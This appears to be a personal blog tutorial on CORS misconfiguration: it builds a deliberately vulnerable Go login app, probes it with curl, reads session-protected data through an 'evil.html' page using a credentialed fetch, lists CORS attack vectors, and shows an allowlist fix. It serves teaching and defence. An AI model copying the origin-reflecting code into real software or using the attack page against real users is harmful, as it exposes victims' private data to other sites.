+++
title = 'Are you from the Same Origin?'
date = 2025-06-01T12:26:43-04:00
draft = false
toc = false
categories = ['web security']
tags = ['cors']
series = ['']
+++

> Recently, when I debugged a web app, I had to add my own test domain to a CORS allowed list there. Then I remembered having seen a CORS vulnerability report before and decided to delve deeper into this topic.

### Create a Simple Web App with CORS Misconfiguration

Essentially, we require a web application with a straightforward login feature and a data endpoint. With misconfigured CORS, we should be able to see the sensitive data from another origin.

> Check out the code repo: https://github.com/ych3r/vuln-apps/tree/main/cors

Because we have a session check, you can't access the sensitive data without login.
```go
cookie, err := r.Cookie("session")
if err != nil || cookie.Value != "valid-session" {
    http.Error(w, "Unauthorized", http.StatusUnauthorized)
    return
}
```
![cors1](/cors/cors-1.png)

But once you login, you will get a session cookie (stored in your browser).
![cors2](/cors/cors-2.png)

Try again and you can see the sensitive data.
![cors3](/cors/cors-3.png)

Now we misconfigure the CORS.
```go
origin := r.Header.Get("Origin")
if origin != "" {
    w.Header().Set("Access-Control-Allow-Origin", origin)
    w.Header().Set("Access-Control-Allow-Credentials", "true")
}
```
This will allow all the origin to access it.

### Attack it

First, we make sure this vulnerability exists. Of course, we test with our own session, and bear with me, I'm too lazy to create another profile. Let's just imagine this sensitive data is not the victim's data.

```sh
╰─$ curl -i http://localhost:8080/api/data -H "Origin: xx.com" -H "Cookie: session=valid-session"
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: xx.com
Content-Type: application/json
Date: Sat, 07 Jun 2025 17:29:12 GMT
Content-Length: 33

{"msg":"you should not see this"}
```

Great, this website accepts any domain we put in. Then, we create a `evil.html` that fetch data with the session cookie in the browser using `include`.
```html
<!DOCTYPE html>
<html>
    <body>
        <script>
            // when fetching a url, the browser automatically sets the Origin header.
            fetch("http://localhost:8080/api/data", {
                credentials: "include"
            }).then(res => res.text())
                .then(data => {
                    alert("data:\n" + data)
                });
        </script>
    </body>
</html>
```
Start a server: `python -m http.server` and open it in the same browser. We see the secret data.

![cors4](/cors/cors-4.png)

> What does it mean?

As long as we let the victim open `evil.html`, and they happened to have a live session on the service, we will be able to bypass the access control and read sensitive data using their session cookie.

We're not going to let it pop up obviously, but we can let it secretly send the data to our server.

### Theory Part

- What is SOP and why do we use it?
  - **Same-origin policy** doesn't allow website to interact with other domains. This is used to prevent malicious cross-domain interactions, like stealing private data.
  - SOP is implemented in the browser's internal engine.
- What is CORS and why do we use it?
  - **Cross-origin resource sharing** is the relaxation of the SOP. Because many websites do need cross-origin access to subdomains or third-party sites.
- What are the attack vectors?
  - **Wildcard in ACAO**: like the example above, it allows any origin to access data.
  - **Errors parsing Origin headers**: some domain on whitelist are using regular expressions, attackers can add prefix or suffix to it, e.g., `normal.com` -> `notnormal.com` or `normal.com` -> `normal.com.evil.net`
  - **null origin value**: the header could be "null". Use sandboxed `iframe` to test it.
  - **XSS via trust relationships**: if the trusted origin is vulnerable to XSS, attacker could still get sensitive data through it.
  - **Breaking TLS**: if 'http' is in the whitelist, attacker could use MitM to control that http site, and then exploit the CORS.
  - **Intranet access**: if there's no `Access-Control-Allow-Credentials: true`, then attacker can only see unauthenticated content (what's the point then). But the victim's browser can be used as a proxy to access internal sites.

### Make it Safe

Because it’s a configuration problem, the solution is fairly easy. We set up an allowed origin list, then other domains won't be able to fetch data.

```go
origin := r.Header.Get("Origin")
allowedOrigins := map[string]bool{
    "https://liuyuchen.dev": true,
}
if allowedOrigins[origin] {
    w.Header().Set("Access-Control-Allow-Origin", origin)
    w.Header().Set("Access-Control-Allow-Credentials", "true")
}
```
![cors5](/cors/cors-5.png)

---

ref:
- Cross-origin resource sharing (CORS) - https://portswigger.net/web-security/cors